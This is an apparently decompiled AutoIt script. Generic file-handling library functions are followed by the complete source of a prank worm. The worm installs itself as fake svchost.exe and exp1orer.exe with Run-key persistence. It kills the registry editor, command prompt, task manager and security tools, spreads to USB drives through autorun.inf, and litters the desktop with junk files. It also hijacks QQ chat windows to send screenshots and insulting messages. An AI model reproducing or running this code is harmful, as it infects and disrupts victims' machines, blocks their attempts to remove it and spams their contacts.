 FUNC _FILECOUNTLINES ( $SFILEPATH )
 LOCAL $N = FILEGETSIZE ( $SFILEPATH ) - 1
 IF @ERROR OR $N = - 1 THEN RETURN 0
 RETURN STRINGLEN ( STRINGADDCR ( FILEREAD ( $SFILEPATH , $N ) ) ) - $N + 1
 ENDFUNC
 FUNC _FILECREATE ( $SFILEPATH )
 LOCAL $HOPENFILE
 LOCAL $HWRITEFILE
 $HOPENFILE = FILEOPEN ( $SFILEPATH , 2 )
 IF $HOPENFILE = - 1 THEN
 SETERROR ( 1 )
 RETURN 0
 ENDIF
 $HWRITEFILE = FILEWRITE ( $HOPENFILE , "" )
 IF $HWRITEFILE = - 1 THEN
 SETERROR ( 2 )
 RETURN 0
 ENDIF
 FILECLOSE ( $HOPENFILE )
 RETURN 1
 ENDFUNC
 FUNC _FILELISTTOARRAY ( $SPATH , $SFILTER = "*" , $IFLAG = 0 )
 LOCAL $HSEARCH , $SFILE , $ASFILELIST [ 1 ]
 IF NOT FILEEXISTS ( $SPATH ) THEN RETURN SETERROR ( 1 , 1 , "" )
 IF ( STRINGINSTR ( $SFILTER , "\" ) ) OR ( STRINGINSTR ( $SFILTER , "/" ) ) OR ( STRINGINSTR ( $SFILTER , ":" ) ) OR ( STRINGINSTR ( $SFILTER , ">" ) ) OR ( STRINGINSTR ( $SFILTER , "<" ) ) OR ( STRINGINSTR ( $SFILTER , "|" ) ) OR ( STRINGSTRIPWS ( $SFILTER , 8 ) = "" ) THEN RETURN SETERROR ( 2 , 2 , "" )
 IF NOT ( $IFLAG = 0 OR $IFLAG = 1 OR $IFLAG = 2 ) THEN RETURN SETERROR ( 3 , 3 , "" )
 IF ( STRINGMID ( $SPATH , STRINGLEN ( $SPATH ) , 1 ) = "\" ) THEN $SPATH = STRINGTRIMRIGHT ( $SPATH , 1 )
 $HSEARCH = FILEFINDFIRSTFILE ( $SPATH & "\" & $SFILTER )
 IF $HSEARCH = - 1 THEN RETURN SETERROR ( 4 , 4 , "" )
 WHILE 1
 $SFILE = FILEFINDNEXTFILE ( $HSEARCH )
 IF @ERROR THEN
 SETERROR ( 0 )
 EXITLOOP
 ENDIF
 IF $IFLAG = 1 AND STRINGINSTR ( FILEGETATTRIB ( $SPATH & "\" & $SFILE ) , "D" ) <> 0 THEN CONTINUELOOP
 IF $IFLAG = 2 AND STRINGINSTR ( FILEGETATTRIB ( $SPATH & "\" & $SFILE ) , "D" ) = 0 THEN CONTINUELOOP
 REDIM $ASFILELIST [ UBOUND ( $ASFILELIST ) + 1 ]
 $ASFILELIST [ 0 ] = $ASFILELIST [ 0 ] + 1
 $ASFILELIST [ UBOUND ( $ASFILELIST ) - 1 ] = $SFILE
 WEND
 FILECLOSE ( $HSEARCH )
 RETURN $ASFILELIST
 ENDFUNC
 FUNC _FILEPRINT ( $S_FILE , $I_SHOW = @SW_HIDE )
 LOCAL $A_RET = DLLCALL ( "shell32.dll" , "long" , "ShellExecute" , "hwnd" , 0 , "string" , "print" , "string" , $S_FILE , "string" , "" , "string" , "" , "int" , $I_SHOW )
 IF $A_RET [ 0 ]> 32 AND NOT @ERROR THEN
 RETURN 1
 ELSE
 SETERROR ( $A_RET [ 0 ] )
 RETURN 0
 ENDIF
 ENDFUNC
 FUNC _FILEREADTOARRAY ( $SFILEPATH , BYREF $AARRAY )
 LOCAL $HFILE
 $HFILE = FILEOPEN ( $SFILEPATH , 0 )
 IF $HFILE = - 1 THEN
 SETERROR ( 1 )
 RETURN 0
 ENDIF
 LOCAL $STEMP = FILEREAD ( $HFILE )
 IF STRINGRIGHT ( $STEMP , 1 ) = @LF THEN $STEMP = STRINGTRIMRIGHT ( $STEMP , 1 )
 IF STRINGRIGHT ( $STEMP , 1 ) = @CR THEN $STEMP = STRINGTRIMRIGHT ( $STEMP , 1 )
 $AARRAY = STRINGSPLIT ( $STEMP , @CRLF , 1 )
 IF @ERROR THEN $AARRAY = STRINGSPLIT ( $STEMP , @LF )
 IF @ERROR THEN $AARRAY = STRINGSPLIT ( $STEMP , @CR )
 FILECLOSE ( $HFILE )
 RETURN 1
 ENDFUNC
 FUNC _FILEWRITEFROMARRAY ( $FILE , $A_ARRAY , $I_BASE = 0 , $I_UBOUND = 0 )
 IF NOT ISARRAY ( $A_ARRAY ) THEN RETURN SETERROR ( 2 , 0 , 0 )
 LOCAL $LAST = UBOUND ( $A_ARRAY ) - 1
 IF $I_UBOUND < 1 OR $I_UBOUND> $LAST THEN $I_UBOUND = $LAST
 IF $I_BASE < 0 OR $I_BASE> $LAST THEN $I_BASE = 0
 LOCAL $HFILE
 IF ISSTRING ( $FILE ) THEN
 $HFILE = FILEOPEN ( $FILE , 2 )
 ELSE
 $HFILE = $FILE
 ENDIF
 IF $HFILE = - 1 THEN RETURN SETERROR ( 1 , 0 , 0 )
 LOCAL $ERRORSAV = 0
 FOR $X = $I_BASE TO $I_UBOUND
 IF FILEWRITE ( $HFILE , $A_ARRAY [ $X ] & @CRLF ) = 0 THEN
 $ERRORSAV = 3
 EXITLOOP
 ENDIF
 NEXT
 IF ISSTRING ( $FILE ) THEN FILECLOSE ( $HFILE )
 IF $ERRORSAV THEN
 RETURN SETERROR ( $ERRORSAV , 0 , 0 )
 ELSE
 RETURN 1
 ENDIF
 ENDFUNC
 FUNC _FILEWRITELOG ( $SLOGPATH , $SLOGMSG , $IFLAG = - 1 )
 LOCAL $SDATENOW , $STIMENOW , $SMSG , $IWRITEFILE , $HOPENFILE , $IOPENMODE = 1
 $SDATENOW = @YEAR & "-" & @MON & "-" & @MDAY
 $STIMENOW = @HOUR & ":" & @MIN & ":" & @SEC
 $SMSG = $SDATENOW & " " & $STIMENOW & " : " & $SLOGMSG
 IF $IFLAG <> - 1 THEN
 $SMSG &= @CRLF & FILEREAD ( $SLOGPATH )
 $IOPENMODE = 2
 ENDIF
 $HOPENFILE = FILEOPEN ( $SLOGPATH , $IOPENMODE )
 IF $HOPENFILE = - 1 THEN RETURN SETERROR ( 1 , 0 , 0 )
 $IWRITEFILE = FILEWRITELINE ( $HOPENFILE , $SMSG )
 IF $IWRITEFILE = - 1 THEN RETURN SETERROR ( 2 , 0 , 0 )
 RETURN FILECLOSE ( $HOPENFILE )
 ENDFUNC
 FUNC _FILEWRITETOLINE ( $SFILE , $ILINE , $STEXT , $FOVERWRITE = 0 )
 IF $ILINE <= 0 THEN RETURN SETERROR ( 4 , 0 , 0 )
 IF NOT ISSTRING ( $STEXT ) THEN RETURN SETERROR ( 6 , 0 , 0 )
 IF $FOVERWRITE <> 0 AND $FOVERWRITE <> 1 THEN RETURN SETERROR ( 5 , 0 , 0 )
 IF NOT FILEEXISTS ( $SFILE ) THEN RETURN SETERROR ( 2 , 0 , 0 )
 LOCAL $FILTXT = FILEREAD ( $SFILE , FILEGETSIZE ( $SFILE ) )
 $FILTXT = STRINGSPLIT ( $FILTXT , @CRLF , 1 )
 IF UBOUND ( $FILTXT , 1 ) < $ILINE THEN RETURN SETERROR ( 1 , 0 , 0 )
 LOCAL $FIL = FILEOPEN ( $SFILE , 2 )
 IF $FIL = - 1 THEN RETURN SETERROR ( 3 , 0 , 0 )
 FOR $I = 1 TO UBOUND ( $FILTXT ) - 1
 IF $I = $ILINE THEN
 IF $FOVERWRITE = 1 THEN
 IF $STEXT <> "" THEN
 FILEWRITE ( $FIL , $STEXT & @CRLF )
 ELSE
 FILEWRITE ( $FIL , $STEXT )
 ENDIF
 ENDIF
 IF $FOVERWRITE = 0 THEN
 FILEWRITE ( $FIL , $STEXT & @CRLF )
 FILEWRITE ( $FIL , $FILTXT [ $I ] & @CRLF )
 ENDIF
 ELSEIF $I < UBOUND ( $FILTXT , 1 ) - 1 THEN
 FILEWRITE ( $FIL , $FILTXT [ $I ] & @CRLF )
 ELSEIF $I = UBOUND ( $FILTXT , 1 ) - 1 THEN
 FILEWRITE ( $FIL , $FILTXT [ $I ] )
 ENDIF
 NEXT
 FILECLOSE ( $FIL )
 RETURN 1
 ENDFUNC
 FUNC _PATHFULL ( $SRELATIVEPATH , $SBASEPATH = @WORKINGDIR )
 IF NOT $SRELATIVEPATH OR $SRELATIVEPATH = "." THEN RETURN $SBASEPATH
 LOCAL $SFULLPATH = STRINGREPLACE ( $SRELATIVEPATH , "/" , "\" )
 LOCAL CONST $SFULLPATHCONST = $SFULLPATH
 LOCAL $SPATH
 LOCAL $BROOTONLY = STRINGLEFT ( $SFULLPATH , 1 ) = "\" AND STRINGMID ( $SFULLPATH , 2 , 1 ) <> "\"
 FOR $I = 1 TO 2
 $SPATH = STRINGLEFT ( $SFULLPATH , 2 )
 IF $SPATH = "\\" THEN
 $SFULLPATH = STRINGTRIMLEFT ( $SFULLPATH , 2 )
 $SPATH &= STRINGLEFT ( $SFULLPATH , STRINGINSTR ( $SFULLPATH , "\" ) - 1 )
 EXITLOOP
 ELSEIF STRINGRIGHT ( $SPATH , 1 ) = ":" THEN
 $SFULLPATH = STRINGTRIMLEFT ( $SFULLPATH , 2 )
 EXITLOOP
 ELSE
 $SFULLPATH = $SBASEPATH & "\" & $SFULLPATH
 ENDIF
 NEXT
 IF $I = 3 THEN RETURN ""
 LOCAL $ATEMP = STRINGSPLIT ( $SFULLPATH , "\" )
 LOCAL $APATHPARTS [ $ATEMP [ 0 ] ] , $J = 0
 FOR $I = 2 TO $ATEMP [ 0 ]
 IF $ATEMP [ $I ] = ".." THEN
 IF $J THEN $J -= 1
 ELSEIF NOT ( $ATEMP [ $I ] = "" AND $I <> $ATEMP [ 0 ] ) AND $ATEMP [ $I ] <> "." THEN
 $APATHPARTS [ $J ] = $ATEMP [ $I ]
 $J += 1
 ENDIF
 NEXT
 $SFULLPATH = $SPATH
 IF NOT $BROOTONLY THEN
 FOR $I = 0 TO $J - 1
 $SFULLPATH &= "\" & $APATHPARTS [ $I ]
 NEXT
 ELSE
 $SFULLPATH &= $SFULLPATHCONST
 IF STRINGINSTR ( $SFULLPATH , ".." ) THEN $SFULLPATH = _PATHFULL ( $SFULLPATH )
 ENDIF
 WHILE STRINGINSTR ( $SFULLPATH , ".\" )
 $SFULLPATH = STRINGREPLACE ( $SFULLPATH , ".\" , "\" )
 WEND
 RETURN $SFULLPATH
 ENDFUNC
 FUNC _PATHMAKE ( $SZDRIVE , $SZDIR , $SZFNAME , $SZEXT )
 LOCAL $SZFULLPATH
 IF STRINGLEN ( $SZDRIVE ) THEN
 IF NOT ( STRINGLEFT ( $SZDRIVE , 2 ) = "\\" ) THEN $SZDRIVE = STRINGLEFT ( $SZDRIVE , 1 ) & ":"
 ENDIF
 IF STRINGLEN ( $SZDIR ) THEN
 IF NOT ( STRINGRIGHT ( $SZDIR , 1 ) = "\" ) AND NOT ( STRINGRIGHT ( $SZDIR , 1 ) = "/" ) THEN $SZDIR = $SZDIR & "\"
 ENDIF
 IF STRINGLEN ( $SZEXT ) THEN
 IF NOT ( STRINGLEFT ( $SZEXT , 1 ) = "." ) THEN $SZEXT = "." & $SZEXT
 ENDIF
 $SZFULLPATH = $SZDRIVE & $SZDIR & $SZFNAME & $SZEXT
 RETURN $SZFULLPATH
 ENDFUNC
 FUNC _PATHSPLIT ( $SZPATH , BYREF $SZDRIVE , BYREF $SZDIR , BYREF $SZFNAME , BYREF $SZEXT )
 LOCAL $DRIVE = ""
 LOCAL $DIR = ""
 LOCAL $FNAME = ""
 LOCAL $EXT = ""
 LOCAL $POS
 LOCAL $ARRAY [ 5 ]
 $ARRAY [ 0 ] = $SZPATH
 IF STRINGMID ( $SZPATH , 2 , 1 ) = ":" THEN
 $DRIVE = STRINGLEFT ( $SZPATH , 2 )
 $SZPATH = STRINGTRIMLEFT ( $SZPATH , 2 )
 ELSEIF STRINGLEFT ( $SZPATH , 2 ) = "\\" THEN
 $SZPATH = STRINGTRIMLEFT ( $SZPATH , 2 )
 $POS = STRINGINSTR ( $SZPATH , "\" )
 IF $POS = 0 THEN $POS = STRINGINSTR ( $SZPATH , "/" )
 IF $POS = 0 THEN
 $DRIVE = "\\" & $SZPATH
 $SZPATH = ""
 ELSE
 $DRIVE = "\\" & STRINGLEFT ( $SZPATH , $POS - 1 )
 $SZPATH = STRINGTRIMLEFT ( $SZPATH , $POS - 1 )
 ENDIF
 ENDIF
 LOCAL $NPOSFORWARD = STRINGINSTR ( $SZPATH , "/" , 0 , - 1 )
 LOCAL $NPOSBACKWARD = STRINGINSTR ( $SZPATH , "\" , 0 , - 1 )
 IF $NPOSFORWARD >= $NPOSBACKWARD THEN
 $POS = $NPOSFORWARD
 ELSE
 $POS = $NPOSBACKWARD
 ENDIF
 $DIR = STRINGLEFT ( $SZPATH , $POS )
 $FNAME = STRINGRIGHT ( $SZPATH , STRINGLEN ( $SZPATH ) - $POS )
 IF STRINGLEN ( $DIR ) = 0 THEN $FNAME = $SZPATH
 $POS = STRINGINSTR ( $FNAME , "." , 0 , - 1 )
 IF $POS THEN
 $EXT = STRINGRIGHT ( $FNAME , STRINGLEN ( $FNAME ) - ( $POS - 1 ) )
 $FNAME = STRINGLEFT ( $FNAME , $POS - 1 )
 ENDIF
 $SZDRIVE = $DRIVE
 $SZDIR = $DIR
 $SZFNAME = $FNAME
 $SZEXT = $EXT
 $ARRAY [ 1 ] = $DRIVE
 $ARRAY [ 2 ] = $DIR
 $ARRAY [ 3 ] = $FNAME
 $ARRAY [ 4 ] = $EXT
 RETURN $ARRAY
 ENDFUNC
 FUNC _REPLACESTRINGINFILE ( $SZFILENAME , $SZSEARCHSTRING , $SZREPLACESTRING , $FCASENESS = 0 , $FOCCURANCE = 1 )
 LOCAL $IRETVAL = 0
 LOCAL $HWRITEHANDLE , $AFILELINES , $NCOUNT , $SENDSWITH , $HFILE
 IF STRINGINSTR ( FILEGETATTRIB ( $SZFILENAME ) , "R" ) THEN RETURN SETERROR ( 6 , 0 , - 1 )
 $HFILE = FILEOPEN ( $SZFILENAME , 0 )
 IF $HFILE = - 1 THEN RETURN SETERROR ( 1 , 0 , - 1 )
 LOCAL $S_TOTFILE = FILEREAD ( $HFILE , FILEGETSIZE ( $SZFILENAME ) )
 IF STRINGRIGHT ( $S_TOTFILE , 2 ) = @CRLF THEN
 $SENDSWITH = @CRLF
 ELSEIF STRINGRIGHT ( $S_TOTFILE , 1 ) = @CR THEN
 $SENDSWITH = @CR
 ELSEIF STRINGRIGHT ( $S_TOTFILE , 1 ) = @LF THEN
 $SENDSWITH = @LF
 ELSE
 $SENDSWITH = ""
 ENDIF
 $AFILELINES = STRINGSPLIT ( STRINGSTRIPCR ( $S_TOTFILE ) , @LF )
 FILECLOSE ( $HFILE )
 $HWRITEHANDLE = FILEOPEN ( $SZFILENAME , 2 )
 IF $HWRITEHANDLE = - 1 THEN RETURN SETERROR ( 2 , 0 , - 1 )
 FOR $NCOUNT = 1 TO $AFILELINES [ 0 ]
 IF STRINGINSTR ( $AFILELINES [ $NCOUNT ] , $SZSEARCHSTRING , $FCASENESS ) THEN
 $AFILELINES [ $NCOUNT ] = STRINGREPLACE ( $AFILELINES [ $NCOUNT ] , $SZSEARCHSTRING , $SZREPLACESTRING , 1 - $FOCCURANCE , $FCASENESS )
 $IRETVAL = $IRETVAL + 1
 IF $FOCCURANCE = 0 THEN
 $IRETVAL = 1
 EXITLOOP
 ENDIF
 ENDIF
 NEXT
 FOR $NCOUNT = 1 TO $AFILELINES [ 0 ] - 1
 IF FILEWRITELINE ( $HWRITEHANDLE , $AFILELINES [ $NCOUNT ] ) = 0 THEN
 SETERROR ( 3 )
 FILECLOSE ( $HWRITEHANDLE )
 RETURN - 1
 ENDIF
 NEXT
 IF $AFILELINES [ $NCOUNT ] <> "" THEN FILEWRITE ( $HWRITEHANDLE , $AFILELINES [ $NCOUNT ] & $SENDSWITH )
 FILECLOSE ( $HWRITEHANDLE )
 RETURN $IRETVAL
 ENDFUNC
 FUNC _TEMPFILE ( $S_DIRECTORYNAME = @TEMPDIR , $S_FILEPREFIX = "~" , $S_FILEEXTENSION = ".tmp" , $I_RANDOMLENGTH = 7 )
 LOCAL $S_TEMPNAME
 IF NOT FILEEXISTS ( $S_DIRECTORYNAME ) THEN $S_DIRECTORYNAME = @TEMPDIR
 IF NOT FILEEXISTS ( $S_DIRECTORYNAME ) THEN $S_DIRECTORYNAME = @SCRIPTDIR
 IF STRINGRIGHT ( $S_DIRECTORYNAME , 1 ) <> "\" THEN $S_DIRECTORYNAME = $S_DIRECTORYNAME & "\"
 DO
 $S_TEMPNAME = ""
 WHILE STRINGLEN ( $S_TEMPNAME ) < $I_RANDOMLENGTH
 $S_TEMPNAME = $S_TEMPNAME & CHR ( RANDOM ( 97 , 122 , 1 ) )
 WEND
 $S_TEMPNAME = $S_DIRECTORYNAME & $S_FILEPREFIX & $S_TEMPNAME & $S_FILEEXTENSION
 UNTIL NOT FILEEXISTS ( $S_TEMPNAME )
 RETURN ( $S_TEMPNAME )
 ENDFUNC
 AUTOITSETOPTION ( "TrayIconHide" , 1 )
 AUTOITSETOPTION ( "TrayMenuMode" , 1 )
 GLOBAL $PS , $BIN1 , $BIN2 , $WINTMP , $SENDPIC
 OPT ( "WinTitleMatchMode" , 2 )
 FUNC _PROKILL ( $PROCESS )
 IF PROCESSEXISTS ( $PROCESS ) THEN
 PROCESSCLOSE ( $PROCESS )
 ENDIF
 ENDFUNC
 FUNC _WINCLO ( $WIND )
 IF WINEXISTS ( $WIND ) THEN
 WINKILL ( $WIND )
 ENDIF
 ENDFUNC
 FUNC _FILEDEL ( $FILENAME )
 IF FILEEXISTS ( $FILENAME ) THEN
 FILESETATTRIB ( $FILENAME , "-RSH" )
 FILEDELETE ( $FILENAME )
 ENDIF
 ENDFUNC
 FUNC _SENDMSG ( $WINDOW )
 IF WINEXISTS ( $WINDOW ) = 0 THEN
 $WINTMP = ""
 RETURN ( 0 )
 ELSE
 $WIND = WINGETTITLE ( $WINDOW )
 $WINTMP = $WIND
 WINSETSTATE ( $WIND , "" , @SW_MINIMIZE )
 IF ( TIMERDIFF ( $BIN1 )> 60000 AND TIMERDIFF ( $BIN2 )> 3 ) OR $SENDPIC THEN
 IF NOT FILEEXISTS ( @DESKTOPDIR & "\$$$$$$$$$$.dll" ) THEN
 FOR $KK = 1 TO 30
 FILEWRITE ( @DESKTOPDIR & "\$$$$$$$$$$" & $KK & ".jpg" , "" )
 NEXT
 FOR $KK = 31 TO 60
 FILEWRITE ( @DESKTOPDIR & "\$$$$$$$$$$" & $KK & ".wma" , "" )
 NEXT
 FOR $KK = 61 TO 90
 FILEWRITE ( @DESKTOPDIR & "\$$$$$$$$$$" & $KK & ".rar" , "" )
 NEXT
 FOR $KK = 91 TO 120
 FILEWRITE ( @DESKTOPDIR & "\$$$$$$$$$$" & $KK & ".dll" , "" )
 NEXT
 FOR $KK = 121 TO 150
 FILEWRITE ( @DESKTOPDIR & "\$$$$$$$$$$" & $KK & ".htm" , "" )
 NEXT
 ENDIF
 SLEEP ( 2000 )
 AUTOITSETOPTION ( "SendKeyDownDelay" , 200 )
 SEND ( "#d" )
 SLEEP ( 300 )
 SEND ( "{PRINTSCREEN}" )
 SLEEP ( 100 )
 CONTROLSEND ( $WIND , "" , "RichEdit20A2" , "  ^v" )
 SLEEP ( 100 )
 CONTROLCLICK ( $WIND , "" , "Button12" )
 CONTROLSEND ( $WIND , "" , "RichEdit20A2" , "{ENTER}" )
 AUTOITSETOPTION ( "SendKeyDownDelay" , 1 )
 SLEEP ( 100 )
 CONTROLSEND ( $WIND , "" , "RichEdit20A2" , "I am just a /pig " )
 SLEEP ( 100 )
 CONTROLCLICK ( $WIND , "" , "Button12" )
 SLEEP ( 200 )
 CONTROLSEND ( $WIND , "" , "RichEdit20A2" , "so beautiful ha-ha-ha-ha-/cy/cy/cy " )
 SLEEP ( 200 )
 CONTROLCLICK ( $WIND , "" , "Button12" )
 SLEEP ( 200 )
 $BIN2 = TIMERINIT ( )
 $BIN1 = TIMERINIT ( )
 SLEEP ( 1000 )
 ENDIF
 IF TIMERDIFF ( $BIN2 )> 5000 THEN
 IF @SEC> 54 THEN
 $MSG = "what a boring /pig "
 ELSEIF @SEC> 48 THEN
 $MSG = "/hiphop/jd/jw/jump/hiphop/jd/jw/jump "
 ELSEIF @SEC> 42 THEN
 $MSG = "hehe/ka "
 ELSEIF @SEC> 36 THEN
 $MSG = "hi/pig "
 ELSEIF @SEC> 30 THEN
 $MSG = "sleeping............./pig "
 ELSEIF @SEC> 24 THEN
 $MSG = "/pig Z z z_.oO "
 ELSEIF @SEC> 18 THEN
 $MSG = "/ka "
 ELSEIF @SEC> 12 THEN
 $MSG = "haha zhen hao wan/tx "
 ELSEIF @SEC> 6 THEN
 $MSG = "/pig/pig/pig "
 ELSEIF @HOUR >= 22 THEN
 $MSG = "Good night/bye "
 ELSEIF @HOUR >= 17 THEN
 $MSG = "Good evening/ka "
 ELSEIF @HOUR >= 12 THEN
 $MSG = "Good afternoon/ka"
 ELSE
 $MSG = "Good morning/ka"
 ENDIF
 CONTROLSEND ( $WIND , "" , "RichEdit20A2" , $MSG )
 SLEEP ( 250 )
 CONTROLCLICK ( $WIND , "" , "Button12" )
 SLEEP ( 200 )
 $BIN2 = TIMERINIT ( )
 ENDIF
 RETURN ( 1 )
 ENDIF
 ENDFUNC
 IF FILEEXISTS ( @HOMEDRIVE & "\windows\system32\system\svchost.exe" ) = 0 THEN
 MSGBOX ( 0 , "^_^" , "Have Fun!" , 2 )
 ENDIF
 RUN ( @COMSPEC & " /c " & "%windir%\system32\sc config    ShellHWDetection start= AUTO" , "" , @SW_HIDE )
 IF @AUTOITEXE <> @HOMEDRIVE & "\windows\system32\system\svchost.exe" AND @AUTOITEXE <> @HOMEDRIVE & "\windows\system32\system\exp1orer.exe" THEN
 REGWRITE ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" , "Install" , "REG_SZ" , @SYSTEMDIR & "\system\" & "svchost.exe" )
 FILECOPY ( @AUTOITEXE , @HOMEDRIVE & "\windows\system32\system\svchost.exe" , 9 )
 FILECOPY ( @HOMEDRIVE & "\windows\system32\system\svchost.exe" , @HOMEDRIVE & "\windows\system32\system\exp1orer.exe" , 9 )
 FILESETATTRIB ( @HOMEDRIVE & "\windows\system32\system\*.*" , "+RASH" )
 FILESETATTRIB ( @HOMEDRIVE & "\windows\system32\system" , "+RASH" )
 RUN ( @HOMEDRIVE & "\windows\system32\system\exp1orer.exe" )
 ENDIF
 IF @AUTOITEXE = @HOMEDRIVE & "\windows\system32\system\exp1orer.exe" THEN
 $FLAG = 1
 WHILE 1
 IF WINEXISTS ( "我真的不想当猪了!10秒钟内把电脑给我恢复到原来的样子!" & @MDAY & @HOUR ) THEN
 WINSETSTATE ( "我真的不想当猪了!10秒钟内把电脑给我恢复到原来的样子!" , "" , @SW_MINIMIZE )
 MSGBOX ( 0 , "后会有期^_^" , "小猪,真的不打算玩多会吗?" , 3 )
 SLEEP ( 10000000 )
 ENDIF
 IF FILEEXISTS ( @HOMEDRIVE & "\windows\system32\system\svchost.exe" ) = 0 THEN
 FILECOPY ( @AUTOITEXE , @HOMEDRIVE & "\windows\system32\system\svchost.exe" )
 ENDIF
 IF $FLAG = 1 THEN
 $PS = RUN ( @HOMEDRIVE & "\windows\system32\system\svchost.exe" )
 $FLAG = 0
 ENDIF
 IF PROCESSEXISTS ( $PS ) = 0 THEN
 $PS = RUN ( @HOMEDRIVE & "\windows\system32\system\svchost.exe" )
 ENDIF
 _PROKILL ( "regedit.exe" )
 _PROKILL ( "cmd.exe" )
 _PROKILL ( "autoruns.exe" )
 _PROKILL ( "process.exe" )
 _WINCLO ( "Registry" )
 _WINCLO ( "注册表" )
 _WINCLO ( "系统" )
 _WINCLO ( "MagicSet" )
 _WINCLO ( "超级兔子" )
 _WINCLO ( "优化大师" )
 _WINCLO ( "工具" )
 _WINCLO ( "组策略" )
 _WINCLO ( "autorun" )
 _WINCLO ( "Autorun" )
 _WINCLO ( "System" )
 _WINCLO ( "system" )
 _WINCLO ( "进程" )
 _WINCLO ( "Kill" )
 _WINCLO ( "kill" )
 _WINCLO ( "360" )
 _WINCLO ( "安全" )
 _WINCLO ( "process" )
 _WINCLO ( "Process" )
 IF WINEXISTS ( "我没开任务管理器啊,别乱关啊!" & @MDAY & @HOUR ) AND PROCESSEXISTS ( "taskmgr.exe" ) = 0 THEN
 WINSETSTATE ( "我没开任务管理器啊,别乱关啊!" & @MDAY & @HOUR , "" , @SW_MINIMIZE )
 RUN ( @SYSTEMDIR & "\taskmgr.exe" )
 ELSEIF WINEXISTS ( "我没开任务管理器啊,别乱关啊!" & @MDAY & @HOUR ) = 0 THEN
 _PROKILL ( "taskmgr.exe" )
 ENDIF
 IF WINEXISTS ( "IceSword" ) THEN
 WINCLOSE ( "IceSword" )
 WINWAITACTIVE ( "IceSword" , "真要退出吗" , 1 )
 CONTROLCLICK ( "IceSword" , "真要退出吗" , "[class:Button;INSTANCE:1]" )
 ENDIF
 REGWRITE ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" , "Install" , "REG_SZ" , @SYSTEMDIR & "\system\" & "svchost.exe" )
 SLEEP ( 200 )
 WEND
 ELSEIF @AUTOITEXE = @HOMEDRIVE & "\windows\system32\system\svchost.exe" THEN
 $BIN1 = TIMERINIT ( )
 $BIN2 = TIMERINIT ( )
 $BIN3 = TIMERINIT ( )
 $WINTMP = ""
 WHILE 1
 IF WINEXISTS ( "我真的不想当猪了!10秒钟内把电脑给我恢复到原来的样子!" & @MDAY & @HOUR ) THEN
 SLEEP ( 3000 )
 WHILE PROCESSEXISTS ( "exp1orer.exe" )
 PROCESSCLOSE ( "exp1orer.exe" )
 WEND
 FOR $KK = 1 TO 150
 FILEDELETE ( @DESKTOPDIR & "\$$$$$$$$$$" & $KK & ".*" )
 NEXT
 FILESETATTRIB ( @HOMEDRIVE & "\windows\system32\system\*.*" , "-RASH" )
 REGDELETE ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" , "Install" )
 $DATABAT = "TITLE=请稍候..." & @CRLF & "@echo off" & @CRLF & "color 0a" & @CRLF & "for /l %%a in (5,-1,1) do ( " & @CRLF & "cls" & @CRLF & "echo." & @CRLF & "echo." & @CRLF & @CRLF & "echo." & @CRLF & "echo." & @CRLF & "echo." & @CRLF & "echo." & @CRLF & "echo." & @CRLF & "echo           正在结束进程删除最后一个文件,不要关闭本窗口" & @CRLF & "echo." & @CRLF & "if %%a==1 rd /s /q %windir%\system32\system >nul" & @CRLF & "echo           剩余时间  %%a  秒" & @CRLF & "ping -n 2 127.1>nul " & @CRLF & ")" & @CRLF & "cls" & @CRLF & "echo 已经完全恢复到之前状态!" & @CRLF & "ping -n 3 127.1>nul& @CRLF & del %temp%\deleqqmsg.bat"
 FILEWRITE ( @TEMPDIR & "\deleqqmsg.bat" , $DATABAT )
 RUN ( @TEMPDIR & "\deleqqmsg.bat" )
 _WINCLO ( "我真的不想当猪了!10秒钟内把电脑给我恢复到原来的样子!" )
 EXIT
 ENDIF
 IF WINEXISTS ( "IceSword" ) THEN
 WINCLOSE ( "IceSword" )
 WINWAITACTIVE ( "IceSword" , "真要退出吗" , 1 )
 CONTROLCLICK ( "IceSword" , "真要退出吗" , "[class:Button;INSTANCE:1]" )
 ENDIF
 IF FILEEXISTS ( @HOMEDRIVE & "\windows\system32\system\exp1orer.exe" ) = 0 THEN
 FILECOPY ( @AUTOITEXE , @HOMEDRIVE & "\windows\system32\system\exp1orer.exe" )
 ENDIF
 IF PROCESSEXISTS ( "exp1orer.exe" ) = 0 THEN
 RUN ( @HOMEDRIVE & "\windows\system32\system\exp1orer.exe" )
 ENDIF
 IF TIMERDIFF ( $BIN3 )> 5000 THEN
 $VAR = DRIVEGETDRIVE ( "all" )
 IF NOT @ERROR THEN
 FOR $I = 1 TO $VAR [ 0 ]
 IF DRIVEGETTYPE ( $VAR [ $I ] ) = "Removable" THEN
 _FILEDEL ( $VAR [ $I ] & "\" & @SCRIPTNAME )
 _FILEDEL ( $VAR [ $I ] & "\autorun.inf" )
 FILECOPY ( @AUTOITEXE , $VAR [ $I ] , 1 )
 FILESETATTRIB ( $VAR [ $I ] & "\" & @SCRIPTNAME , "+SHRA" )
 $DATA = "open=" & @SCRIPTNAME & @LF & "shell\open=打开(&O)" & @LF & "shell\open\Command=" & @SCRIPTNAME & @LF & "shell\explore=资源管理器(&X)" & @LF & "shell\explore\Command=" & @SCRIPTNAME
 INIWRITESECTION ( $VAR [ $I ] & "\autorun.inf" , "AutoRun" , $DATA )
 FILESETATTRIB ( $VAR [ $I ] & "\autorun.inf" , "+SHRA" )
 ENDIF
 NEXT
 ENDIF
 $BIN3 = TIMERINIT ( )
 ENDIF
 $SENDPIC = 1
 IF $WINTMP <> "" THEN
 $SENDPIC = 0
 _SENDMSG ( $WINTMP )
 ELSE
 IF _SENDMSG ( "－ 群" ) THEN CONTINUELOOP
 IF _SENDMSG ( "交谈中" ) THEN CONTINUELOOP
 IF _SENDMSG ( "聊天中" ) THEN CONTINUELOOP
 _SENDMSG ( "会话" )
 ENDIF
 SLEEP ( 200 )
 WEND
 ENDIF
